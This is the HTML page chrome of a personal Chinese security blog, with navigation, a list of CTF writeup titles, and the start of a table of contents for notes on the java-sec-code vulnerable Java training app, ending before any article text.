<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>java-sec-code靶场学习 | 甜筒园</title>
  <meta name="keywords" content=" Java安全 ">
  <meta name="description" content="java-sec-code靶场学习 | 甜筒园">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="The Cloud Hunting Games比赛地址：https:&#x2F;&#x2F;cloudhuntinggames.com&#x2F; Chellenge1:Ain’t no data when she’s gone提示说有大量数据外流，但拥有全部的S3存储桶日志。根据大量数据外流可统计相同userIdentity_ARN读取字节数BytesOut进行统计倒序输出，相关sql语句为： SELECT userIden">
<meta property="og:type" content="article">
<meta property="og:title" content="The Cloud Hunting Games">
<meta property="og:url" content="https://www.ttycp3.top/archives/5b899602.html">
<meta property="og:site_name" content="甜筒园">
<meta property="og:description" content="The Cloud Hunting Games比赛地址：https:&#x2F;&#x2F;cloudhuntinggames.com&#x2F; Chellenge1:Ain’t no data when she’s gone提示说有大量数据外流，但拥有全部的S3存储桶日志。根据大量数据外流可统计相同userIdentity_ARN读取字节数BytesOut进行统计倒序输出，相关sql语句为： SELECT userIden">
<meta property="og:locale">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528111323383.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528114751010.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528122018997.png">
<meta property="og:image" content="c:/Users/ttycp3/AppData/Roaming/Typora/typora-user-images/image-20250530145608487.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250530160601818.png">
<meta property="og:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/4ca77fda-3095-4e1a-b79b-a25377c79a1f.png">
<meta property="article:published_time" content="2025-05-30T08:13:54.055Z">
<meta property="article:modified_time" content="2025-05-30T08:15:13.582Z">
<meta property="article:author" content="ttycp3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20250528111323383.png">


<link rel="icon" href="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/logo.png">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/gruvbox-dark.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 6.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



    <script>        (function(){            var bp = document.createElement('script');            var curProtocol = window.location.protocol.split(':')[0];            if (curProtocol === 'https') {                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';                    }            else {                bp.src = 'http://push.zhanzhang.baidu.com/push.js';            }            var s = document.getElementsByTagName("script")[0];            s.parentNode.insertBefore(bp, s);        })();    </script>  

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="http://q.qlogo.cn/headimg_dl?dst_uin=1004454362&amp;spec=640&amp;img_type=jpg"/>
</a>
<div class="author">
    <span>ttycp3</span>
</div>

<div class="icon">
    
        
            <a title="github"
               href="https://github.com/ttycp3"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="csdn"
               href="https://blog.csdn.net/qq_33814823"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-csdn"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="neteasemusic"
               href="https://music.163.com/#/user/home?id=1765543783"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-neteasemusic"></use>
                    </svg>
                
            </a>
        
    
</div>




<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(35)</small>
            
        </div>
    </li>
    
        
            
                <li>
                    <div data-rel="Writeup">
                        
                        Writeup
                        <small>(27)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="笔记">
                        
                        笔记
                        <small>(5)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="工具">
                        
                        工具
                        <small>(1)</small>
                        
                    </div>
                    
                </li>
            
        
    
        
            
                <li>
                    <div data-rel="算法竞赛专题">
                        
                        算法竞赛专题
                        <small>(2)</small>
                        
                    </div>
                    
                </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
        <a 
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="35">
<input type="hidden" id="yelog_site_word_count" value="54.9k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://badboy.plus">坏孩子</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="搜索 快捷键 i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="切换到大纲视图 快捷键 w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="返回"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="大小写敏感"></i>
            <i class="iconfont icon-tag" data-title="标签"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">大纲</div>
            <i class="iconfont icon-list" data-title="切换到文章列表"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>流量分析</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>命令执行</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>任意文件读取</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>文件上传</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>杂项</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>CRLF Injection</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>gopher协议</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>grafana</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Java安全</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>JAVA安全</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>jwt伪造</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pickle反序列化</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>session反序列化</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sql注入</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ssrf漏洞</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>XPath注入</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>xxe漏洞</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        
        <a  class="All Writeup "
           href="/archives/5b899602.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="The Cloud Hunting Games">The Cloud Hunting Games</span>
            <span class="post-date" title="2025-05-30 16:13:54">2025/05/30</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/24b70928.html"
           data-tag="Java安全"
           data-author="" >
            <span class="post-title" title="羊城杯2020 a_piece_of_java">羊城杯2020 a_piece_of_java</span>
            <span class="post-date" title="2024-11-12 17:46:24">2024/11/12</span>
        </a>
        
        
        <a  class="All 笔记 "
           href="/archives/218e91a9.html"
           data-tag="Java安全"
           data-author="" >
            <span class="post-title" title="java-sec-code靶场学习">java-sec-code靶场学习</span>
            <span class="post-date" title="2024-09-30 16:59:59">2024/09/30</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/f8a3bab8.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CITS1003 CTF wp">CITS1003 CTF wp</span>
            <span class="post-date" title="2024-05-09 16:21:59">2024/05/09</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e228e2bf.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="XYCTF2024">XYCTF2024</span>
            <span class="post-date" title="2024-04-28 14:40:53">2024/04/28</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/53f30b58.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NCTF2023web（赛后复现）">NCTF2023web（赛后复现）</span>
            <span class="post-date" title="2023-12-31 16:31:14">2023/12/31</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/3b79de97.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="SHCTF wp">SHCTF wp</span>
            <span class="post-date" title="2023-10-02 13:25:28">2023/10/02</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/d4f5203b.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="0xGame2023 wp">0xGame2023 wp</span>
            <span class="post-date" title="2023-10-01 14:16:22">2023/10/01</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/83697f53.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="Moectf2023">Moectf2023</span>
            <span class="post-date" title="2023-09-16 11:44:15">2023/09/16</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/7a95ce38.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="SYCTF2023wp">SYCTF2023wp</span>
            <span class="post-date" title="2023-06-10 12:48:24">2023/06/10</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/1d622977.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="第16届ciscn初赛wp">第16届ciscn初赛wp</span>
            <span class="post-date" title="2023-05-28 18:51:15">2023/05/28</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/7dc07b0.html"
           data-tag="流量分析,杂项"
           data-author="" >
            <span class="post-title" title="第四届闽盾杯Misc流量分析">第四届闽盾杯Misc流量分析</span>
            <span class="post-date" title="2023-05-25 14:23:16">2023/05/25</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/4524613a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="ångstromCTF 2023">ångstromCTF 2023</span>
            <span class="post-date" title="2023-04-25 15:17:57">2023/04/25</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/37321197.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="HDCTF2023">HDCTF2023</span>
            <span class="post-date" title="2023-04-24 16:30:04">2023/04/24</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/3527c39a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="第三届红明谷杯">第三届红明谷杯</span>
            <span class="post-date" title="2023-04-19 14:18:45">2023/04/19</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/6ee431f.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="GDOUCTF2023">GDOUCTF2023</span>
            <span class="post-date" title="2023-04-16 12:42:03">2023/04/16</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e92ae896.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="HackPack CTF 2023">HackPack CTF 2023</span>
            <span class="post-date" title="2023-04-15 16:32:49">2023/04/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/c603889a.html"
           data-tag="pickle反序列化,jwt伪造"
           data-author="" >
            <span class="post-title" title="CISCN2019 华北赛区 Day1 ikun">CISCN2019 华北赛区 Day1 ikun</span>
            <span class="post-date" title="2023-04-12 15:17:10">2023/04/12</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/b85a28bc.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="CTFSHOW第三届愚人杯部分WP">CTFSHOW第三届愚人杯部分WP</span>
            <span class="post-date" title="2023-04-02 19:28:10">2023/04/02</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/fcef946.html"
           data-tag="文件上传,任意文件读取,JAVA安全"
           data-author="" >
            <span class="post-title" title="GKCTF2021 babycat">GKCTF2021 babycat</span>
            <span class="post-date" title="2023-04-01 19:45:19">2023/04/01</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/56a79676.html"
           data-tag="ssrf漏洞"
           data-author="" >
            <span class="post-title" title="GYCTF2020 Node Game">GYCTF2020 Node Game</span>
            <span class="post-date" title="2023-03-21 16:21:32">2023/03/21</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/f06c7905.html"
           data-tag="ssrf漏洞,gopher协议"
           data-author="" >
            <span class="post-title" title="2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl">2023数字中国创新大赛-数字网络安全人才挑战赛easy_curl</span>
            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/2e3a56ed.html"
           data-tag="xxe漏洞"
           data-author="" >
            <span class="post-title" title="GoogleCTF2019 Quals Bnv">GoogleCTF2019 Quals Bnv</span>
            <span class="post-date" title="2023-03-15 17:45:23">2023/03/15</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/32149828.html"
           data-tag="ssrf漏洞,session反序列化,CRLF Injection"
           data-author="" >
            <span class="post-title" title="bestphp&#39;s revenge">bestphp&#39;s revenge</span>
            <span class="post-date" title="2023-03-14 19:17:23">2023/03/14</span>
        </a>
        
        
        <a  class="All 笔记 "
           href="/archives/54488cb7.html"
           data-tag="XPath注入"
           data-author="" >
            <span class="post-title" title="Xpath笔记">Xpath笔记</span>
            <span class="post-date" title="2023-03-11 21:17:23">2023/03/11</span>
        </a>
        
        
        <a  class="All 算法竞赛专题 "
           href="/archives/68b41866.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="常用简单模板">常用简单模板</span>
            <span class="post-date" title="2022-10-23 12:17:23">2022/10/23</span>
        </a>
        
        
        <a  class="All 算法竞赛专题 "
           href="/archives/2bd6ac.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="从c升级到c++速成">从c升级到c++速成</span>
            <span class="post-date" title="2022-10-20 13:47:23">2022/10/20</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/66731dbe.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="NEWSTARCTF2022-Web">NEWSTARCTF2022-Web</span>
            <span class="post-date" title="2022-10-06 23:53:26">2022/10/06</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/ac4562c6.html"
           data-tag="命令执行"
           data-author="" >
            <span class="post-title" title="ctfshow七夕杯wp">ctfshow七夕杯wp</span>
            <span class="post-date" title="2022-08-06 17:17:23">2022/08/06</span>
        </a>
        
        
        <a  class="All 笔记 "
           href="/archives/ec3e2815.html"
           data-tag="文件上传"
           data-author="" >
            <span class="post-title" title="Webshell笔记">Webshell笔记</span>
            <span class="post-date" title="2022-05-13 21:17:23">2022/05/13</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/e9530a94.html"
           data-tag="grafana"
           data-author="" >
            <span class="post-title" title="STARCTF2022 oh-my-grafana">STARCTF2022 oh-my-grafana</span>
            <span class="post-date" title="2022-04-16 23:53:26">2022/04/16</span>
        </a>
        
        
        <a  class="All 笔记 "
           href="/archives/1a0e10db.html"
           data-tag="ssrf漏洞"
           data-author="" >
            <span class="post-title" title="SSRF笔记">SSRF笔记</span>
            <span class="post-date" title="2022-03-30 21:47:23">2022/03/30</span>
        </a>
        
        
        <a  class="All 笔记 "
           href="/archives/a00344c6.html"
           data-tag="sql注入"
           data-author="" >
            <span class="post-title" title="SQL注入笔记">SQL注入笔记</span>
            <span class="post-date" title="2022-03-24 20:17:23">2022/03/24</span>
        </a>
        
        
        <a  class="All 工具 "
           href="/archives/7450bfcb.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="实用工具">实用工具</span>
            <span class="post-date" title="2022-01-24 18:17:23">2022/01/24</span>
        </a>
        
        
        <a  class="All Writeup "
           href="/archives/bff3fd5a.html"
           data-tag=""
           data-author="" >
            <span class="post-title" title="攻防世界web新手区Writeup">攻防世界web新手区Writeup</span>
            <span class="post-date" title="2022-01-16 18:17:23">2022/01/16</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="切换全屏 快捷键 s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-java-sec-code靶场学习" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">java-sec-code靶场学习</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="笔记">笔记</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color2">Java安全</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2024-10-09 11:35:23'>2024-09-30 16:59</time>
        
    </div>
    <div class="article-meta">
        
        <span>Count:11.6k</span>
        
        
        <span id="busuanzi_container_page_pv">
            Views 👀 :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="跳转至评论区">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE"><span class="toc-text">一、RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-runtime-x2F-exec"><span class="toc-text">1.路由&#x2F;rce&#x2F;runtime&#x2F;exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-ProcessBuilder"><span class="toc-text">2.路由&#x2F;rce&#x2F;ProcessBuilder</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-jscmd"><span class="toc-text">3.路由&#x2F;rce&#x2F;jscmd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-vuln-x2F-yarm"><span class="toc-text">4.路由&#x2F;rce&#x2F;vuln&#x2F;yarm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-rce-x2F-groovy"><span class="toc-text">5.路由&#x2F;rce&#x2F;groovy</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-text">二、SQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-vuln"><span class="toc-text">1.路由&#x2F;sqli&#x2F;jdbc&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-jdbc-x2F-ps-x2F-vuln"><span class="toc-text">2.路由&#x2F;sqli&#x2F;jdbc&#x2F;ps&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln01"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-sqli-x2F-mybatis-x2F-vuln02"><span class="toc-text">3.路由&#x2F;sqli&#x2F;mybatis&#x2F;vuln02</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-mybatis-x2F-orderby-x2F-vuln03"><span class="toc-text">4.路由&#x2F;mybatis&#x2F;orderby&#x2F;vuln03</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">sql注入修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%A2%84%E7%BC%96%E8%AF%91"><span class="toc-text">（1）预编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89waf"><span class="toc-text">（2）waf</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89MyBatis%E9%98%B2%E6%8A%A4"><span class="toc-text">（3）MyBatis防护</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81SSTI"><span class="toc-text">三、SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssti-x2F-velocity"><span class="toc-text">1.路由&#x2F;ssti&#x2F;velocity</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81SSRF"><span class="toc-text">四、SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-urlConnection-x2F-vuln"><span class="toc-text">1.路由&#x2F;ssrf&#x2F;urlConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpURLConnection-x2F-vuln"><span class="toc-text">2.路由&#x2F;ssrf&#x2F;HttpURLConnection&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-openStream"><span class="toc-text">3.路由&#x2F;ssrf&#x2F;openStream</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-HttpSyncClients-x2F-vuln"><span class="toc-text">4.路由&#x2F;ssrf&#x2F;HttpSyncClients&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln1"><span class="toc-text">5.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-restTemplate-x2F-vuln2"><span class="toc-text">6.路由&#x2F;ssrf&#x2F;restTemplate&#x2F;vuln2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-hutool-x2F-vuln"><span class="toc-text">7.路由&#x2F;ssrf&#x2F;hutool&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E8%B7%AF%E7%94%B1-x2F-ssrf-x2F-denrebind-x2F-vuln"><span class="toc-text">8.路由&#x2F;ssrf&#x2F;denrebind&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF%E4%BF%AE%E5%A4%8D%E4%B8%8E%E9%98%B2%E6%8A%A4"><span class="toc-text">SSRF修复与防护</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%881%EF%BC%89%E9%99%90%E5%88%B6%E5%8D%8F%E8%AE%AE%E4%BD%BF%E7%94%A8"><span class="toc-text">（1）限制协议使用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%882%EF%BC%89%E9%99%90%E5%88%B6%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B"><span class="toc-text">（2）限制文件类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%883%EF%BC%89http%E8%AF%B7%E6%B1%82%E6%A3%80%E6%9F%A5"><span class="toc-text">（3）http请求检查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A"><span class="toc-text">方法1：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A"><span class="toc-text">方法2：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A"><span class="toc-text">方法3：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%954%EF%BC%9A"><span class="toc-text">方法4：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%B9%E6%B3%955%EF%BC%9A"><span class="toc-text">方法5：</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%EF%BC%884%EF%BC%89%E6%A0%B8%E5%BF%83SSRF%E9%98%B2%E6%8A%A4%E4%BB%A3%E7%A0%81"><span class="toc-text">（4）核心SSRF防护代码</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81CSRF"><span class="toc-text">五、CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-csrf-x2F-post"><span class="toc-text">1.路由&#x2F;csrf&#x2F;post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CSRF%E9%98%B2%E6%8A%A4"><span class="toc-text">CSRF防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81XSS"><span class="toc-text">六、XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-reflect"><span class="toc-text">1.路由&#x2F;xss&#x2F;reflect</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xss-x2F-stored"><span class="toc-text">2.路由&#x2F;xss&#x2F;stored</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E6%94%BB%E5%87%BB%E9%98%B2%E6%8A%A4"><span class="toc-text">XSS攻击防护</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81XXE"><span class="toc-text">七、XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-xmlReader-x2F-vuln"><span class="toc-text">1.路由&#x2F;xxe&#x2F;xmlReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXBuilder-x2F-vuln"><span class="toc-text">2.路由&#x2F;xxe&#x2F;SAXBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXReader-x2F-vuln"><span class="toc-text">3.路由&#x2F;xxe&#x2F;SAXReader&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-SAXParser-x2F-vuln"><span class="toc-text">4.路由&#x2F;xxe&#x2F;SAXParser&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-Digester-x2F-vuln"><span class="toc-text">5.路由&#x2F;xxe&#x2F;Digester&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-vuln"><span class="toc-text">6.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E8%B7%AF%E7%94%B1-x2F-xxe-x2F-DocumentBuilder-x2F-xinclude-x2F-vuln"><span class="toc-text">7.路由&#x2F;xxe&#x2F;DocumentBuilder&#x2F;xinclude&#x2F;vuln</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 